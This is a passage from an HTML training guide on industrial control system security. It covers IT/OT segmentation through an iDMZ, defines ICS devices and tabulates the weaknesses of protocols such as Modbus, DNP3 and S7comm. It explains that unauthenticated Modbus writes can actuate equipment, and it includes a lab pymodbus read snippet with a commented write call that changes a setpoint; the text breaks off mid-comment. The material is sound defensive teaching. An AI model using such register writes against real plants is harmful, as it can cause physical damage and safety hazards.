important control</div><p>All traffic between IT (Levels 4/5) and OT (Levels 0–3) must pass through the iDMZ — there should be NO direct connections from corporate IT to a PLC. Historians replicate into the iDMZ so business users read data without touching OT; remote vendor access is brokered through the iDMZ with MFA and jump hosts. A flat network where an IT workstation can reach a PLC directly is the number-one finding in almost every OT assessment.</p></div><h2>2.1 Device glossary</h2><ul><li><strong>PLC (Programmable Logic Controller): </strong>a rugged industrial computer running deterministic “ladder logic” to control a process.</li><li><strong>RTU (Remote Terminal Unit): </strong>like a PLC, used for geographically distributed/remote sites.</li><li><strong>HMI (Human-Machine Interface): </strong>the operator's screen for monitoring and control.</li><li><strong>SCADA (Supervisory Control and Data Acquisition): </strong>the system that supervises and collects data from distributed processes.</li><li><strong>DCS (Distributed Control System): </strong>plant-wide control, common in continuous processes (refineries, chemicals).</li><li><strong>Historian: </strong>a time-series database recording process values for analysis.</li><li><strong>SIS (Safety Instrumented System): </strong>an independent, last-resort safety layer that brings the process to a safe state (the system TRITON targeted — the most dangerous to attack).</li></ul><h1 id=\"sec3\">3. Industrial Protocols (Know Their Weaknesses)</h1><div class=\"tbl-wrap\"><table><thead><tr><th>Protocol</th><th>Used in</th><th>Security reality</th></tr></thead><tbody><tr><td>Modbus / Modbus TCP</td><td>Ubiquitous register read/write</td><td>No auth, no encryption; TCP port 502; trivially spoofed</td></tr><tr><td>DNP3</td><td>Electric/water utilities, SCADA</td><td>Authentication only in 'Secure DNP3'</td></tr><tr><td>EtherNet/IP (CIP)</td><td>Rockwell / Allen-Bradley</td><td>Widely deployed; weak native security</td></tr><tr><td>PROFINET / PROFIBUS</td><td>Siemens automation</td><td>Real-time; relies on segmentation</td></tr><tr><td>S7comm</td><td>Siemens S7 PLCs</td><td>Proprietary; targeted by Stuxnet-class attacks</td></tr><tr><td>OPC UA</td><td>Modern interoperability</td><td>Supports authentication + encryption — the secure choice</td></tr></tbody></table></div><p><strong>The core lesson: </strong>Modbus has no authentication. Anyone who can route a packet to a PLC's port 502 can issue a “write coil” or “write register” command and physically actuate equipment — open a valve, stop a pump, change a setpoint. There is no password to defeat because there is no password. Security therefore comes almost entirely from the network architecture (segmentation, conduits), not from the protocol.</p><pre class=\"code\"><code># Reading Modbus registers (PASSIVE/LAB only). Library: pymodbus\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('10.0.1.50')                  # a PLC in a LAB\nregs = c.read_holding_registers(0, 10).registers  # read 10 registers\nprint(regs)\n# A WRITE (c.write_register(40001, 999)) changes a physical setpoint.\n# NEVER i
